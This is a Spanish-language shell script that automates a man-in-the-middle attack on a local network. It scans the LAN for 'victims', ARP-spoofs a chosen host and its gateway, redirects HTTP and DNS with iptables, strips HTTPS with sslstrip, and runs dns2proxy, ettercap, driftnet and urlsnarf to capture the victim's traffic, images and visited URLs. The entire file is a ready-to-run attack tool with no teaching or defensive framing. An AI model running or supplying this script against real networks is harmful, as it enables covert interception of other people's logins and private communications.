#!/bin/sh
quit="no"
echo "------------------------------------------------"
echo "CONFIGURANDO EQUIPO PARA ATAQUE MITM"
echo "------------------------------------------------"
echo "Configurando etter.conf"
sed -ie 's/#redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"/redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"/g' /etc/ettercap/etter.conf
sed -ie 's/#redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"/redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"/g' /etc/ettercap/etter.conf
echo "--------------------------------------------> OK"
echo ""
echo "Activando ip_forward"
echo "1" | sudo tee /proc/sys/net/ipv4/ip_forward
echo "--------------------------------------------> OK"
echo ""
echo "Configurando iptables"
iptables -t nat -I PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 9000
iptables -t nat -I PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 53
echo "--------------------------------------------> OK"
echo ""
echo "Indica tu interface de red:"
ifconfig -s | awk '{print $1}' | grep -v Iface | grep -v lo
echo "------------------------------------------------"
read interface
echo "--------------------------------------------> OK"
echo ""
echo ""
echo "------------------------------------------------"
echo "BUSCADOR DE VICTIMAS"
echo "------------------------------------------------"
tuip=$(ifconfig $interface | grep 'Direc. inet:' | awk '{print $2}' | cut --characters=6-20)
echo "Tu dirección ip: $tuip"
rango=$(route -n | grep $interface | grep -v UG | awk '{print $1}' | awk -F '.' '{print $1"."$2"."$3".*"}')
echo "Rango a escanear: $rango"
echo ""
echo "Mostrando lista de usuarios conectados a la red"
echo "------------------------------------------------"
echo "NMAP:"
rangoNMAP=$(echo $rango | awk -F '.' '{print $1}')
nmap -sP $rango --system-dns -e $interface | grep -v "Starting" | grep -v up | awk '{print $5}' | grep . | grep $rangoNMAP 
echo ""
echo "ARP-SCAN"
arp-scan -I $interface -l | grep -v Interface | grep -v Starting | grep -v packets | grep -v Ending |  awk '{print $1}'
echo ""
echo "Indica la ip de la víctima:"
echo "------------------------------------------------"
read victima
echo "--------------------------------------------> OK"
echo ""
echo ""
echo "------------------------------------------------"
echo "INICIANDO ATAQUE MITM"
echo "------------------------------------------------"
echo "Iniciando arpspoof"
penlaces=$(route -n | grep $interface | grep UG | awk '{print $2}' | sed 's/ //g')
echo "Puerta de enlace: $penlaces"
echo "------------------------------------------------"
echo ""
xterm -hold -e arpspoof -i $interface -t $victima $penlaces &
xterm -hold -e arpspoof -i $interface -t $penlaces $victima &
sleep 3
echo "--------------------------------------------> OK"
echo ""
echo "Iniciando ssltrip2"
xterm -hold -e sslstrip -s -f -k -l 9000 -w log.txt &
echo "--------------------------------------------> OK"
sleep 3
echo ""
echo "Iniciando dns2proxy"
cd dns2proxy
cp victims.cfg victims1.ORIG
echo "$victima" > victims.cfg
xterm -hold -e sudo python dns2proxy.py &
cd ..
echo ""
echo "Iniciando ettercap"
xterm -hold -e ettercap -T -q -i $interface $(echo "/$victima// ///") &
echo "--------------------------------------------> OK"
echo ""
echo "Iniciando driftnet"
xterm -hold -e driftnet -i $interface &
echo "--------------------------------------------> OK"
echo ""
echo "Iniciando urlsnarf"
xterm -hold -e urlsnarf -i $interface &
echo "--------------------------------------------> OK"
echo ""
echo ""
while :; do
echo "------------------------------------------------"
echo "1- Reiniciar sslsrip2"
echo "2- Reiniciar dns2proxy"
echo "3- QUIERES SALIR?"
echo "------------------------------------------------"
read resp
echo ""
if [ "$resp" = "1" ]; then
xterm -hold -e sslstrip -l 59271 --ssl -k -f -w sslstrip.log &
elif [ "$resp" = "2" ]; then
xterm -hold -e python dns2proxy.py &
elif [ "$resp" = "3" ]; then
killall xterm
echo "Desactivando ip_forward"
echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward
echo "--------------------------------------------> OK"
echo ""
echo "Reconfigurando etter.conf"
sed -ie 's/redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"/#redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"/g' /etc/ettercap/etter.conf
sed -ie 's/redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"/#redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"/g' /etc/ettercap/etter.conf
echo "--------------------------------------------> OK"
echo ""
echo "Eliminando regla IPTABLES"
echo "Configurando iptables"
iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 9000
iptables -t nat -D PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 53
iptables -t nat -F
echo "--------------------------------------------> OK"
echo ""
echo "Eliminando configuracion DNS2PROXY"
rm dns2proxy/victims.cfg
mv dns2proxy/victims1.ORIG dns2proxy/victims.cfg
echo "--------------------------------------------> OK"
break
fi
done
